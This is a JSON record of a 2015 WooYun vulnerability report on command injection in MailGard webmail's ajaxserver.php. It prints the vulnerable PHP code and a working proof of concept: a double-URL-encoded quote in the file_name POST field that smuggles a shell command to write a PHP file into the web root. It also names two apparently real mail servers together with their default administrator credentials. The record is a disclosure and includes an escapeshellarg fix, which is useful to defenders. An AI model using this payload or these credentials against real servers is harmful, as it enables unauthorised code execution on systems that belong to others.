{"id": 35103, "wybug_id": "wooyun-2015-097939", "wybug_title": "佑友mailgard webmail命令执行之二", "wybug_corp": "深圳市河辰通讯技术有限公司", "wybug_author": "f4ckbaidu", "wybug_date": "2015-02-21 22:23", "wybug_open_date": "2015-05-31 09:04", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["系统命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向公众公开  简要描述： 与wooyun-2015-097649类似的命令执行漏洞 详细说明：  在wooyun-2015-097649的基础上补充下先来看下全局函数：（/var/www/newmail/include/common.php）\nif(!MAGIC_QUOTES_GPC){\tforeach($_COOKIE as $key => $val){\t\tif(is_array($val)){\t\t\tforeach($val as $k => $v){\t\t\t\t$val[$k] = addslashes($v);\t\t\t}\t\t}else{\t\t\t$val = addslashes($val);\t\t}\t\t$_COOKIE[$key] = $val;\t}\tforeach($_POST as $key => $val){\t\tif(is_array($val)){\t\t\tforeach($val as $k => $v){\t\t\t\t$val[$k] = addslashes($v);\t\t\t}\t\t}else{\t\t\t$val = addslashes($val);\t\t}\t\t$_POST[$key] = $val;\t}\tforeach($_GET as $key => $val){\t\tif(is_array($val)){\t\t\tforeach($val as $k => $v){\t\t\t\t$val[$k] = addslashes($v);\t\t\t}\t\t}else{\t\t\t$val = addslashes($val);\t\t}\t\t$_GET[$key] = $val;\t}\t\t}\n可以看到对GPC的value做了addslashes处理其实还包含了360的webscan防注入，这里没啥关系就不贴了再来看/var/www/newmail/src/ajaxserver.php的问题代码：\nif($_GET['exec']=='saveToNet'){\t//  保存到网络硬盘\tlist($box_name,$uid) = explode(':', $_GET['sd']);\t\t$file_name = urldecode($_POST['file_name']);\t$net_dir = $_POST['net_dir'];\t\t$dir = $gTmpUploadDir.$box_name.$uid.\"/\";\tif(!is_dir($dir)){//目录不存在，创建目录并生成文件\t\t@mkdir($dir,0722,true);//逐层检查创建0700权限  \t\tselect_mailbox($connection,$box_name);\t\t\t$entity = parse_entity('type','application/',$box_name,$uid,'',true);\t\tforeach($entity as $val){\t\t\t$mail_attachment = mail_body($connection,$uid,$val['entity_id'],$val['encoding']);\t\t\t\t\t\t$att_name = $val['filename'];\t\t\t$file = fopen($dir.$att_name,'w');\t\t\tfwrite($file,$mail_attachment);\t\t\tfclose($file);\t\t}\t}\t\t$fArr = explode('.', $file_name);\t$fSuffix = end($fArr);\t$fPrefix = substr($file_name, 0, -(strlen($fSuffix)+1));\t$movefile = $gNetDiskDir.$net_dir.\"/\".$file_name;\t$auton = 0;\t$goexpr = true;\twhile($goexpr){\t\tif(is_file($movefile)){\t\t\t$movefile = $gNetDiskDir.$net_dir.\"/\".$fPrefix.'('.$auton.').'.$fSuffix;\t\t\t$auton++;\t\t}else{\t\t\t$goexpr = false;\t\t}\t}\t\texec(\"cd '\".$dir.\"'; cp '\".$file_name.\"' '\".$movefile.\"'\",$rs,$res);\tif($result>0 || $res===0){\t\techo '<meta http-equiv=\"Content-Type\" content=\"text/html; charset='.$default_charset.'\" />' ;\t\techo '<script type=\"text/javascript\">';\t\techo 'alert(\"'.$language['show_save_net_ok'].'\");';\t\techo '</script>';\t}\texit;}\n问题在于：$file_name = urldecode($_POST['file_name']);exec(\"cd '\".$dir.\"'; cp '\".$file_name.\"' '\".$movefile.\"'\",$rs,$res);虽然exec函数里$file_name有单引号包含，但是$file_name = urldecode($_POST['file_name']);，可以2次urlencode单引号绕过addslashesPOC如下：1、找个账号登录http://mail.xxx.com/2、打开http://mail.xxx.com/src/ajaxserver.php?exec=saveToNet&sd=aa:admin3、POST net_dir=a&file_name=%2527|echo %2527<?php phpinfo();?>%2527>/var/www/newmail/phpinfo.php%25274、访问http://mail.xxx.com/phpinfo.php\n\n\n\n\n\n\n\n   漏洞证明：  http://mail.iconergy.com:889/默认帐号密码admin hicomadmin\n\n\n\nhttp://mail.szjhqh.com/默认帐号密码admin hicomadmin\n\n\n\n   修复方案：  exec(\"cd '\".$dir.\"'; cp '\".escapeshellarg($file_name).\"' '\".$movefile.\"'\",$rs,$res);   版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-03-02 09:04 厂商回复： 暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}